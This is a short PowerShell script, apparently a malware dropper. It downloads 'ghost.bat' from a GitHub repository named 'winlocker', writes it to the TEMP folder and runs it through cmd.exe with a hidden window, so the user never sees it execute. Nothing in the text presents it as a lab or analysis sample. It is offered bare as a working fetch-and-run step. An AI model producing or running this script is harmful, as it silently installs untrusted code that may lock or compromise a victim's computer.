$url = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/ghost.bat"
$path = "$env:TEMP\ghost.bat"
Invoke-WebRequest -Uri $url -OutFile $path
Start-Process cmd.exe -ArgumentList "/c $path" -WindowStyle Hidden
